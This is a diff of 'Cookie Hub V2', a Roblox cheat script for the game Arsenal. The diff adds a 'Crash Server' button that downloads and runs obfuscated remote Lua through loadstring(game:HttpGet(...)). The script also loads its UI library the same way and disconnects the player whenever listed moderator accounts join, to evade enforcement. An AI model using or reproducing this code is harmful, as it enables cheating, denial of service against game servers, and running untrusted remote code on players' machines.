@@ -1,3 +1,12 @@
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+print("current Version is: 2.1")
+warn("RASPBERRY PI IS A TRUE SKIDDY AF")
+
+if not game.Players.LocalPlayer.Character.Head:FindFirstChild("CookieHubLoaded") then
+
 local ArsoniaTable={
     Player={
         Anti_Aim={
@@ -327,34 +336,231 @@ local ArsoniaTable={
     },
 }
 
-local exploit = ""
+Luazifier = {} 
+setmetatable(Luazifier, {__metatable = "Lol"})
 
-if KRNL_LOADED then
-	exploit = "Krnl"
-elseif syn then
-	exploit = "Synapse X"
-elseif secure_load then
-	exploit = "Sentinel"
-elseif is_sirhurt_closure then
-	exploit = "Sirhurt"
-elseif pebc_execute then
-	exploit = "Protosmasher"
-elseif jit then
-	exploit = "EasyExploits API"
-elseif getscriptenvs then
-	exploit = "Calamari"
-elseif OXYGEN_LOADED then
-	exploit = "Oxygen U"
-elseif IsElectron then
-	exploit = "Electron"
-elseif WrapGlobal then
-	exploit = "WeAreDevs API"
-else
-	exploit = "Supported"
+Luazifier.ScreenGui1 = Instance.new("ScreenGui", game.CoreGui)
+Luazifier.Frame1 = Instance.new("Frame", Luazifier.ScreenGui1)
+Luazifier.ImageLabel1 = Instance.new("ImageLabel", Luazifier.Frame1)
+Luazifier.Frame2 = Instance.new("Frame", Luazifier.Frame1)
+Luazifier.TextLabel1 = Instance.new("TextLabel", Luazifier.Frame2)
+Luazifier.Frame3 = Instance.new("Frame", Luazifier.Frame1)
+Luazifier.TextLabel2 = Instance.new("TextLabel", Luazifier.Frame3)
+
+Luazifier.ScreenGui1.DisplayOrder = 0
+Luazifier.ScreenGui1.Enabled = true
+Luazifier.ScreenGui1.IgnoreGuiInset = false
+Luazifier.ScreenGui1.Name = "Support Ukraine"
+Luazifier.ScreenGui1.ResetOnSpawn = true
+Luazifier.ScreenGui1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Luazifier.ScreenGui1.Archivable = true
+Luazifier.ScreenGui1.AutoLocalize = true
+
+Luazifier.Frame1.Active = false
+Luazifier.Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
+Luazifier.Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
+Luazifier.Frame1.BackgroundTransparency = 1
+Luazifier.Frame1.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Luazifier.Frame1.BorderSizePixel = 1
+Luazifier.Frame1.LayoutOrder = 0
+Luazifier.Frame1.Name = "SupportFrame"
+Luazifier.Frame1.Position = UDim2.new(0.5, 0, 0.5, 0)
+Luazifier.Frame1.Rotation = 0
+Luazifier.Frame1.Selectable = false
+Luazifier.Frame1.Size = UDim2.new(0, 546, 0, 100)
+Luazifier.Frame1.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Luazifier.Frame1.Style = Enum.FrameStyle.Custom
+Luazifier.Frame1.Visible = true
+Luazifier.Frame1.ZIndex = 1
+Luazifier.Frame1.Archivable = true
+Luazifier.Frame1.ClipsDescendants = false
+Luazifier.Frame1.AutoLocalize = true
+
+Luazifier.ImageLabel1.Active = false
+Luazifier.ImageLabel1.AnchorPoint = Vector2.new(0, 0)
+Luazifier.ImageLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
+Luazifier.ImageLabel1.BackgroundTransparency = 1
+Luazifier.ImageLabel1.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Luazifier.ImageLabel1.BorderSizePixel = 0
+Luazifier.ImageLabel1.LayoutOrder = 0
+Luazifier.ImageLabel1.Name = "Flag"
+Luazifier.ImageLabel1.Position = UDim2.new(0.41844692826271057, 0, 0.04678363725543022, 0)
+Luazifier.ImageLabel1.Rotation = 0
+Luazifier.ImageLabel1.Selectable = false
+Luazifier.ImageLabel1.Size = UDim2.new(0, 90, 0, 90)
+Luazifier.ImageLabel1.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Luazifier.ImageLabel1.Visible = true
+Luazifier.ImageLabel1.ZIndex = 1
+Luazifier.ImageLabel1.Archivable = true
+Luazifier.ImageLabel1.ClipsDescendants = false
+Luazifier.ImageLabel1.AutoLocalize = true
+Luazifier.ImageLabel1.Image = "http://www.roblox.com/asset/?id=1403367287"
+Luazifier.ImageLabel1.ImageColor3 = Color3.new(1, 1, 1)
+Luazifier.ImageLabel1.ImageRectOffset = Vector2.new(0, 0)
+Luazifier.ImageLabel1.ImageRectSize = Vector2.new(0, 0)
+Luazifier.ImageLabel1.ImageTransparency = 1
+Luazifier.ImageLabel1.ScaleType = Enum.ScaleType.Stretch
+Luazifier.ImageLabel1.SliceScale = 1
+
+Luazifier.Frame2.Active = false
+Luazifier.Frame2.AnchorPoint = Vector2.new(0, 0)
+Luazifier.Frame2.BackgroundColor3 = Color3.new(1, 1, 1)
+Luazifier.Frame2.BackgroundTransparency = 1
+Luazifier.Frame2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Luazifier.Frame2.BorderSizePixel = 1
+Luazifier.Frame2.LayoutOrder = 0
+Luazifier.Frame2.Name = "RightBlock"
+Luazifier.Frame2.Position = UDim2.new(0, 0, 0, 0)
+Luazifier.Frame2.Rotation = 0
+Luazifier.Frame2.Selectable = false
+Luazifier.Frame2.Size = UDim2.new(0, 227, 0, 100)
+Luazifier.Frame2.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Luazifier.Frame2.Style = Enum.FrameStyle.Custom
+Luazifier.Frame2.Visible = true
+Luazifier.Frame2.ZIndex = 1
+Luazifier.Frame2.Archivable = true
+Luazifier.Frame2.ClipsDescendants = true
+Luazifier.Frame2.AutoLocalize = true
+
+Luazifier.TextLabel1.Active = false
+Luazifier.TextLabel1.AnchorPoint = Vector2.new(0, 0)
+Luazifier.TextLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
+Luazifier.TextLabel1.BackgroundTransparency = 1
+Luazifier.TextLabel1.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Luazifier.TextLabel1.BorderSizePixel = 1
+Luazifier.TextLabel1.LayoutOrder = 0
+Luazifier.TextLabel1.Name = "Lbl1"
+Luazifier.TextLabel1.Position = UDim2.new(0.996688961982727, 0, 0.25017544627189636, 0)
+Luazifier.TextLabel1.Rotation = 0
+Luazifier.TextLabel1.Selectable = false
+Luazifier.TextLabel1.Size = UDim2.new(0, 228, 0, 50)
+Luazifier.TextLabel1.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Luazifier.TextLabel1.Visible = true
+Luazifier.TextLabel1.ZIndex = 1
+Luazifier.TextLabel1.Archivable = true
+Luazifier.TextLabel1.ClipsDescendants = false
+Luazifier.TextLabel1.AutoLocalize = true
+Luazifier.TextLabel1.Font = Enum.Font.DenkOne
+Luazifier.TextLabel1.Text = "Cookie Hub V2"
+Luazifier.TextLabel1.TextColor3 = Color3.new(1, 1, 1)
+Luazifier.TextLabel1.TextScaled = false
+Luazifier.TextLabel1.TextSize = 35
+Luazifier.TextLabel1.TextStrokeColor3 = Color3.new(0, 0, 0)
+Luazifier.TextLabel1.TextStrokeTransparency = 1
+Luazifier.TextLabel1.TextTransparency = 0
+Luazifier.TextLabel1.TextTruncate = Enum.TextTruncate.None
+Luazifier.TextLabel1.TextWrapped = false
+Luazifier.TextLabel1.TextXAlignment = Enum.TextXAlignment.Center
+Luazifier.TextLabel1.TextYAlignment = Enum.TextYAlignment.Center
+
+Luazifier.Frame3.Active = false
+Luazifier.Frame3.AnchorPoint = Vector2.new(0, 0)
+Luazifier.Frame3.BackgroundColor3 = Color3.new(1, 1, 1)
+Luazifier.Frame3.BackgroundTransparency = 1
+Luazifier.Frame3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Luazifier.Frame3.BorderSizePixel = 1
+Luazifier.Frame3.LayoutOrder = 0
+Luazifier.Frame3.Name = "LeftBlock"
+Luazifier.Frame3.Position = UDim2.new(0.5824176073074341, 0, 0, 0)
+Luazifier.Frame3.Rotation = 0
+Luazifier.Frame3.Selectable = false
+Luazifier.Frame3.Size = UDim2.new(0, 228, 0, 100)
+Luazifier.Frame3.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Luazifier.Frame3.Style = Enum.FrameStyle.Custom
+Luazifier.Frame3.Visible = true
+Luazifier.Frame3.ZIndex = 1
+Luazifier.Frame3.Archivable = true
+Luazifier.Frame3.ClipsDescendants = true
+Luazifier.Frame3.AutoLocalize = true
+
+Luazifier.TextLabel2.Active = false
+Luazifier.TextLabel2.AnchorPoint = Vector2.new(0, 0)
+Luazifier.TextLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
+Luazifier.TextLabel2.BackgroundTransparency = 1
+Luazifier.TextLabel2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Luazifier.TextLabel2.BorderSizePixel = 1
+Luazifier.TextLabel2.LayoutOrder = 0
+Luazifier.TextLabel2.Name = "Lbl2"
+Luazifier.TextLabel2.Position = UDim2.new(-1.0022845268249512, 0, 0.25017544627189636, 0)
+Luazifier.TextLabel2.Rotation = 0
+Luazifier.TextLabel2.Selectable = false
+Luazifier.TextLabel2.Size = UDim2.new(0, 228, 0, 50)
+Luazifier.TextLabel2.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Luazifier.TextLabel2.Visible = true
+Luazifier.TextLabel2.ZIndex = 1
+Luazifier.TextLabel2.Archivable = true
+Luazifier.TextLabel2.ClipsDescendants = false
+Luazifier.TextLabel2.AutoLocalize = true
+Luazifier.TextLabel2.Font = Enum.Font.DenkOne
+Luazifier.TextLabel2.Text = "Best In Arsenal."
+Luazifier.TextLabel2.TextColor3 = Color3.new(1, 1, 1)
+Luazifier.TextLabel2.TextScaled = false
+Luazifier.TextLabel2.TextSize = 35
+Luazifier.TextLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
+Luazifier.TextLabel2.TextStrokeTransparency = 1
+Luazifier.TextLabel2.TextTransparency = 0
+Luazifier.TextLabel2.TextTruncate = Enum.TextTruncate.None
+Luazifier.TextLabel2.TextWrapped = false
+Luazifier.TextLabel2.TextXAlignment = Enum.TextXAlignment.Center
+Luazifier.TextLabel2.TextYAlignment = Enum.TextYAlignment.Center
+
+
+
+local getByName = function(N)
+	for i,v in pairs(Luazifier) do
+		if v.Name and v.Name == N then
+			return v
+		end
+	end
+	return nil
 end
 
+local Flag = getByName("Flag")
+local LeftSideText = getByName("Lbl1")
+local RightSideText = getByName("Lbl2")
+
+while task.wait() do
+	if Flag.ImageTransparency == 0 then
+		break
+	end
+	Flag.ImageTransparency = Flag.ImageTransparency - 0.01
+end
+
+repeat task.wait() until Flag.ImageTransparency == 0
+
+local OriginalPositions = {}
+OriginalPositions[1] = LeftSideText.Position
+OriginalPositions[2] = RightSideText.Position
+
+LeftSideText:TweenPosition(UDim2.new(0, 0, 0.25, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 1)
+task.wait(1)
+RightSideText:TweenPosition(UDim2.new(0, 0, 0.25, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 1)
+
+task.wait(2)
+
+LeftSideText:TweenPosition(OriginalPositions[1], Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 1)
+task.wait(1)
+RightSideText:TweenPosition(OriginalPositions[2], Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 1)
+task.wait(1)
+
+while task.wait() do
+	if Flag.ImageTransparency == 1 then
+		break
+	end
+	Flag.ImageTransparency = Flag.ImageTransparency + 0.01
+end
+
+repeat task.wait() until Flag.ImageTransparency == 1
+
+getByName("Support Ukraine"):Destroy()
+wait()
+
+print("anim by inno on youtube, so credits here dont expose pls link to yt: youtube.com/c/wtchaa")
+print("thank you kiriot for esp!")
+print("crash server in beta so risky, and not by me, obfuscated (EXPOSE ME THAT I AM SKIDDING)")
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Cookie Hub", HidePremium = true, IntroText = "Cookie Hub - "..exploit, SaveConfig = true, ConfigFolder = exploit})
+local Window = OrionLib:MakeWindow({Name = "Cookie Hub", HidePremium = true, IntroEnabled = false, SaveConfig = true, ConfigFolder = "CookieHubRootFolderOf"..identifyexecutor()})
 local replicationstorage = game.ReplicatedStorage
 _G.infinjump = false
 
@@ -1361,24 +1567,6 @@ MiscTab:AddToggle({
 })
 
 MiscTab:AddButton({
-	Name = "Unlock FPS",
-	Callback = function()
-		if setfpscap then
-			setfpscap(430)
-		elseif set_fps_cap then
-			set_fps_cap(430)
-		else
-			OrionLib:MakeNotification({
-				Name = "Unlock FPS - Cookie Hub V2",
-				Content = "Your exploit is not supported setfpscap.",
-				Image = "rbxassetid://4483345998",
-				Time = 5
-			})	
-		end
-  	end
-})
-
-MiscTab:AddButton({
 	Name = "Night Blade Knife (Equip Dagger)",
 	Callback = function()
 		_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
@@ -1392,6 +1580,18 @@ MiscTab:AddButton({
 	Callback = function()
 		game.Players.LocalPlayer.Character.Spawned:Destroy()
 		game.Players.LocalPlayer.Character.Humanoid.Jump = true
+  	end
+})
+
+MiscTab:AddButton({
+	Name = "Crash Server",
+	Callback = function()
+		local credit='guardscripts'
+		print("script not made by me so, credits: guardscripts")
+		local url=('https://raw.githubusercontent.com/%s/myscripts/main/scriptinit.lua'):format(credit)
+		init=loadstring(game:HttpGet(url,true))
+		getgenv().xscriptId='XzIwNDU='
+		init()
   	end
 })
 
@@ -1422,13 +1622,19 @@ MiscTab:AddDropdown({
 	end    
 })
 
-game.ReplicatedStorage.Events.CoolNewRemote:FireServer("MouseButton1")
-
-while wait(2.3) do
+while wait(2) do
     for i, v in pairs(game.Players:GetChildren()) do
         local ui = v.UserId
         if ui == 1711686684 or ui == 30926698 or ui == 121247273 or ui == 430335792 or ui == 63590514 or ui == 9486667 or ui == 71305063 or ui == 291643630 or ui == 9624991 or ui == 90807940 or ui == 85159204 or ui == 1330516136 or ui == 1095419 or ui == 17030889 or ui == 24681378 or ui == 25828512 or ui == 43795134 or ui == 20408132 or ui == 49405424 or ui == 23915919 or ui == 2205401822 or ui == 52187831 or ui == 33184799 or ui == 62505243 or ui == 6512464 or ui == 21464308 or ui == 47939131 or ui == 2820112 or ui == 23239501 or ui == 9960695 or ui == 7928245 then
-            game.Players.LocalPlayer:Kick("The Moderator/Developer is in server.")
+            game.Players.LocalPlayer:Kick("The Moderator/Developer is in the server.")
         end
     end
+end
+
+OrionLib:Init()
+local lol = Instance.new("BoolValue")
+lol.Parent = game.Players.LocalPlayer.Character.Head
+lol.Name = "CookieHubLoaded"
+else
+	prnt("Cookie Hub ALREADY Loaded")
 end
